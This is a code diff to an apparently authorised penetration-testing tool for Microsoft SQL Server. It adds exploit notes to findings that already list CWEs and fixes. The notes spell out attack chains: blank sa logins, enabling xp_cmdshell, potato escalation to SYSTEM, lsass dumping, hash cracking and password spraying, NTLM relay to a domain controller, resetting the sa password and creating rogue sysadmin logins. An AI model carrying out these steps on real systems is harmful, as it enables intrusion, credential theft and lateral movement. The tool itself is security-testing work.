@@ -1003,7 +1003,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                           ctx),
                     "Change every default MSSQL login to a strong unique password; "
                     "enforce a password policy; consider disabling `sa`.",
-                    ["CWE-521", "CWE-798", "CWE-1392"], kind="mssql_default_creds"))
+                    ["CWE-521", "CWE-798", "CWE-1392"], kind="mssql_default_creds",
+                    exploit_note=(
+                        "impacket-mssqlclient sa@<ip> -p <port> (blank/known pw), then: "
+                        "enable_xp_cmdshell; xp_cmdshell whoami — for SeImpersonate "
+                        "follow with GodPotato/PrintSpoofer to SYSTEM."),
+                    depth_tier="t2"))
 
             esp = scripts.get("ms-sql-empty-password", "")
             blank = (any("empty password" in (v.title or "").lower() and v.port == t.portid
@@ -1017,7 +1022,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     _fill("impacket-mssqlclient sa@<ip> -p <port>   # blank password; then "
                           "enable_xp_cmdshell; xp_cmdshell whoami", ctx),
                     "Set a strong sa password (or disable sa); enforce a password policy.",
-                    ["CWE-521", "CWE-1392"], kind="blank_login"))
+                    ["CWE-521", "CWE-1392"], kind="blank_login",
+                    exploit_note=(
+                        "impacket-mssqlclient sa@<ip> -p <port> with blank; then "
+                        "EXEC sp_configure 'show advanced options',1; RECONFIGURE; "
+                        "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; "
+                        "EXEC xp_cmdshell 'whoami'."),
+                    depth_tier="t1"))
 
             # xp_cmdshell already enabled -> RCE as the service account.
             xpc = scripts.get("ms-sql-xp-cmdshell", "")
@@ -1028,7 +1039,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "service account.", "impacket-mssqlclient / nxc",
                     _fill("nxc mssql <ip> -u <user> -p <pass> -x whoami", ctx),
                     "Disable xp_cmdshell; run SQL under a low-privilege gMSA.",
-                    ["CWE-250"], kind="xp_cmdshell"))
+                    ["CWE-250"], kind="xp_cmdshell",
+                    exploit_note=(
+                        "nxc mssql <ip> -u <user> -p <pass> -x whoami OR "
+                        "impacket-mssqlclient <user>@<ip> then xp_cmdshell whoami. "
+                        "Capture host + service acct + SeImpersonate for potato chain."),
+                    depth_tier="t1"))
 
             # Pre-auth NTLM / host / domain disclosure (relay/coercion target). Prefer
             # recce's native TDS NTLM leak (airgap, no nmap); fall back to the NSE script.
@@ -1601,7 +1617,12 @@ def chains_from_enum(target: dict, enum: dict, creds: dict | None,
             f"{me} is a member of the sysadmin server role (xp_cmdshell / RCE).",
             "nxc / impacket-mssqlclient",
             _fill("nxc mssql <ip> -u <user> -p <pass> -x whoami", ctx),
-            "Least-privilege the login; remove sysadmin.", ["CWE-250", "CWE-269"], kind="sysadmin_creds"))
+            "Least-privilege the login; remove sysadmin.", ["CWE-250", "CWE-269"], kind="sysadmin_creds",
+            exploit_note=(
+                "impacket-mssqlclient <domain>/<user>:<pass>@<ip>; enable_xp_cmdshell; "
+                "xp_cmdshell whoami. From there SeImpersonate -> potato -> SYSTEM -> "
+                "lsass.exe dump via mimikatz/nanodump."),
+            depth_tier="t1"))
 
     imp_sa = [r[0] for r in enum.get("impersonate", []) if len(r) > 1 and r[1] == "1"]
     if imp_sa and not is_sa:
@@ -1613,7 +1634,11 @@ def chains_from_enum(target: dict, enum: dict, creds: dict | None,
             "impacket-mssqlclient",
             _fill(f"EXECUTE AS LOGIN = '{who}'; SELECT IS_SRVROLEMEMBER('sysadmin'); "
                   "-- then run xp_cmdshell; REVERT", ctx),
-            "Remove IMPERSONATE grants pointing at sysadmin logins.", ["CWE-269"], kind="impersonation"))
+            "Remove IMPERSONATE grants pointing at sysadmin logins.", ["CWE-269"], kind="impersonation",
+            exploit_note=(
+                "In mssqlclient: EXECUTE AS LOGIN='sa'; SELECT "
+                "IS_SRVROLEMEMBER('sysadmin'); then EXEC xp_cmdshell 'whoami'; REVERT."),
+            depth_tier="t1"))
 
     trust = [r for r in enum.get("databases", []) if len(r) > 2 and r[1] == "1"]
     trust_sa = trustworthy_sysadmin_dbs(enum)
@@ -1643,7 +1668,13 @@ def chains_from_enum(target: dict, enum: dict, creds: dict | None,
                 _fill(f"USE [{db}]; CREATE PROCEDURE dbo.x WITH EXECUTE AS OWNER AS "
                       "EXEC sp_addsrvrolemember '<user>','sysadmin'; EXEC dbo.x;", ctx),
                 "Turn off TRUSTWORTHY; don't set a sysadmin as the owner of a user DB.",
-                ["CWE-269"], kind="trustworthy"))
+                ["CWE-269"], kind="trustworthy",
+                exploit_note=(
+                    "USE [<trustdb>]; CREATE PROC dbo.x WITH EXECUTE AS OWNER AS "
+                    "EXEC sp_addsrvrolemember '<user>','sysadmin'; EXEC dbo.x; "
+                    "verify IS_SRVROLEMEMBER('sysadmin')=1; then EXEC "
+                    "sp_dropsrvrolemember."),
+                depth_tier="t1"))
 
     links = [r[0] for r in enum.get("links", [])]
     if links:
@@ -1663,7 +1694,12 @@ def chains_from_enum(target: dict, enum: dict, creds: dict | None,
             "xp_cmdshell = 1 - run OS commands as the SQL service account now.",
             "nxc / impacket-mssqlclient",
             _fill("nxc mssql <ip> -u <user> -p <pass> -x whoami", ctx),
-            "Disable xp_cmdshell; run SQL under a low-privilege gMSA.", ["CWE-250"], kind="xp_cmdshell"))
+            "Disable xp_cmdshell; run SQL under a low-privilege gMSA.", ["CWE-250"], kind="xp_cmdshell",
+            exploit_note=(
+                "nxc mssql <ip> -u <user> -p <pass> -x whoami OR "
+                "impacket-mssqlclient <user>@<ip> then xp_cmdshell whoami. "
+                "Capture host + service acct + SeImpersonate for potato chain."),
+            depth_tier="t1"))
 
     hashes = [r[0] for r in enum.get("hashes", [])]
     if hashes:
@@ -1673,7 +1709,12 @@ def chains_from_enum(target: dict, enum: dict, creds: dict | None,
             "offline with hashcat -m 1731 and reuse across the estate.",
             "impacket-mssqlclient",
             "hashcat -m 1731 mssql_hashes.txt wordlist.txt",
-            "Rotate SQL logins; enforce a strong password policy.", ["CWE-522"], kind="hashes"))
+            "Rotate SQL logins; enforce a strong password policy.", ["CWE-522"], kind="hashes",
+            exploit_note=(
+                "hashcat -m 1731 mssql_hashes.txt rockyou.txt; then for each cracked, "
+                "sqlauth_login sprays across every discovered MSSQL — plus try each "
+                "cracked pw against SMB/LDAP for account reuse."),
+            depth_tier="t3"))
 
     # Active file-read primitive confirmation. The `fileread` enum section
     # actually runs OPENROWSET(BULK,...) against a universally-present
@@ -1705,7 +1746,12 @@ def chains_from_enum(target: dict, enum: dict, creds: dict | None,
                 "role it inherits from); ensure the SQL service account runs "
                 "under a low-privilege identity with restricted filesystem "
                 "ACLs.",
-                ["CWE-732", "CWE-284"], kind="mssql_openrowset_read"))
+                ["CWE-732", "CWE-284"], kind="mssql_openrowset_read",
+                exploit_note=(
+                    "SELECT BulkColumn FROM OPENROWSET(BULK "
+                    "'C:\\inetpub\\wwwroot\\web.config', SINGLE_CLOB) AS x; "
+                    "grep <add name= for DB connection strings and reuse."),
+                depth_tier="t2"))
             break
 
     # Multi-hop impersonation chain: any login the current session can
@@ -1740,7 +1786,12 @@ def chains_from_enum(target: dict, enum: dict, creds: dict | None,
                   "IS_SRVROLEMEMBER('sysadmin'); REVERT", ctx),
             "REVOKE IMPERSONATE ON LOGIN::<sysadmin> from the current login; "
             "audit `sys.server_permissions` for every IMPERSONATE grant.",
-            ["CWE-269"], kind="mssql_impersonation_chain"))
+            ["CWE-269"], kind="mssql_impersonation_chain",
+            exploit_note=(
+                "EXECUTE AS LOGIN='<hop1>'; EXECUTE AS LOGIN='<hop2>'; "
+                "SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin'); REVERT; REVERT "
+                "— then xp_cmdshell inside the sa context."),
+            depth_tier="t1"))
 
     # Stored credential objects + Agent proxies -> the (often privileged) accounts
     # SQL Server holds a secret for. The identity is readable; the password is
@@ -1760,7 +1811,12 @@ def chains_from_enum(target: dict, enum: dict, creds: dict | None,
                   "Get-SQLServerLinkedServerLogin -Instance <ip>   # decrypt with the SMK",
                   ctx),
             "Remove unused credentials/proxies; use gMSA over stored passwords.",
-            ["CWE-522", "CWE-257"], kind="stored_credentials"))
+            ["CWE-522", "CWE-257"], kind="stored_credentials",
+            exploit_note=(
+                "PowerUpSQL: Import-Module PowerUpSQL; Get-SQLCredential -Instance <ip>; "
+                "Get-SQLServerLinkedServerLogin -Instance <ip> — needs sysadmin + DAC "
+                "(add ,1434 to conn or -DAC)."),
+            depth_tier="t0"))
 
     # Linked-server logins with a FIXED mapping (uses_self_credential=0) carry a
     # stored remote password - often mapping to sa on the remote instance.
@@ -1779,7 +1835,12 @@ def chains_from_enum(target: dict, enum: dict, creds: dict | None,
             _fill("PowerUpSQL: Get-SQLServerLinkedServerLogin -Instance <ip>   "
                   "# decrypts the stored linked-server passwords (sysadmin)", ctx),
             "Use self-mapping / least-privilege remote logins; avoid mapping to sa.",
-            ["CWE-522", "CWE-257"], kind="linked_fixed_login"))
+            ["CWE-522", "CWE-257"], kind="linked_fixed_login",
+            exploit_note=(
+                "mssqlpwner <domain>/<user>:<pass>@<ip> get-linked-server-password "
+                "(needs sa+DAC); then reuse recovered pw against remote via "
+                "impacket-mssqlclient."),
+            depth_tier="t0"))
         chain.append("recover stored linked-server credential(s) ("
                      + ", ".join(f"{srv}->{remote}" for srv, remote in fixed[:3]) + ")")
 
@@ -1809,7 +1870,12 @@ def chains_from_enum(target: dict, enum: dict, creds: dict | None,
             _fill("impacket-mssqlclient <domain>/<user>:<pass>@<ip>   # abuse: e.g. "
                   "IMPERSONATE ANY LOGIN -> EXECUTE AS; ALTER ANY LOGIN -> reset sa", ctx),
             "Revoke the permission; grant least privilege, not server-wide control.",
-            ["CWE-269", "CWE-266"], kind="server_perms"))
+            ["CWE-269", "CWE-266"], kind="server_perms",
+            exploit_note=(
+                "IMPERSONATE ANY LOGIN: EXECUTE AS LOGIN='sa'; ALTER ANY LOGIN: "
+                "ALTER LOGIN sa WITH PASSWORD='Recce!123'; CONTROL SERVER: implicit "
+                "sa. Then xp_cmdshell whoami."),
+            depth_tier="t1"))
 
     # Server permissions over-granted to the public role (every login inherits them).
     pub_server = sorted({r[0].upper() for r in enum.get("publicserver", []) if r and r[0]}
@@ -1956,7 +2022,12 @@ def link_findings(target: dict, nodes: list[dict], creds: dict | None):
             f"(depth {n['depth']}).", "impacket-mssqlclient / mssqlpwner",
             _nested_at(n["path"], _RCE_INNER),
             "Fix the linked-server login mapping (don't map to sysadmin); disable "
-            "'rpc out' where not required.", ["CWE-269", "CWE-284"], kind="linked_sysadmin"))
+            "'rpc out' where not required.", ["CWE-269", "CWE-284"], kind="linked_sysadmin",
+            exploit_note=(
+                "EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''',1;RECONFIGURE;"
+                "EXEC xp_cmdshell ''''whoami'''''') AT [HOP2]') AT [HOP1] "
+                "— use link_runner then walk chain; capture whoami output on remote."),
+            depth_tier="t2"))
         chain.append(f"reach SYSADMIN on {server} via linked chain ({route}) -> "
                      "xp_cmdshell RCE")
     if nodes and not sa_nodes:
@@ -2018,7 +2089,12 @@ def relay_finding(target: dict, rtargets: list[dict], lhost: str,
         "high", "UNC coercion -> NTLM relay of the SQL service account", tgt, detail,
         "impacket-ntlmrelayx + mssqlclient", cmd,
         "Enforce SMB signing + LDAP channel binding/EPA; run SQL under a low-priv gMSA.",
-        ["CWE-522", "CWE-269"], kind="relay")
+        ["CWE-522", "CWE-269"], kind="relay",
+        exploit_note=(
+            "Terminal 1: impacket-ntlmrelayx -t ldaps://<dc> --delegate-access "
+            "--no-dump; Terminal 2: EXEC master..xp_dirtree '\\\\<LHOST>\\recce' "
+            "via mssqlclient — SQL svc acct relays to DC for RBCD."),
+        depth_tier="t1")
 
 
 def run_xp_dirtree(ip: str, creds: dict, lhost: str, port: int = _DEFAULT_PORT,
@@ -2224,7 +2300,12 @@ def datamine_findings(target: dict, mined: dict, creds: dict | None):
             _fill("impacket-mssqlclient <domain>/<user>:<pass>@<ip>   "
                   "# then SELECT the columns above (redact PII in your notes)", ctx),
             "Least-privilege the login off the data plane; encrypt/tokenise sensitive "
-            "columns; monitor bulk reads.", ["CWE-200", "CWE-522"], kind="data_at_rest")]
+            "columns; monitor bulk reads.", ["CWE-200", "CWE-522"], kind="data_at_rest",
+            exploit_note=(
+                "In mssqlclient: SELECT TOP 20 <col1>,<col2> FROM "
+                "<db>.<schema>.<table>; if pwd/token cols, hashcat/crack + reuse "
+                "via nxc across the estate."),
+            depth_tier="t3")]
     return [_finding(
         "info", f"Database inventory ({ndb} db, {total} tables)", tgt,
         f"Enumerated {ndb} database(s) and {total} table(s); no obviously sensitive "
@@ -2392,7 +2473,12 @@ def write_proof_finding(target: dict, ev: dict, creds: dict | None):
         "impacket-mssqlclient",
         "recce mssql -u <user> -p <pass> --prove-write   # reversible proof",
         "Restrict DDL/DML and role-management rights to least privilege.",
-        ["CWE-269", "CWE-284"], kind="write_proof")
+        ["CWE-269", "CWE-284"], kind="write_proof",
+        exploit_note=(
+            "CREATE LOGIN recce_x WITH PASSWORD='R3cce!Aa', CHECK_POLICY=OFF; "
+            "ALTER SERVER ROLE sysadmin ADD MEMBER recce_x — then sqlauth_login "
+            "as recce_x from remote."),
+        depth_tier="t2")
 
 
 # --- proof screenshots (terminal-style, for the technical walkthrough) ----------
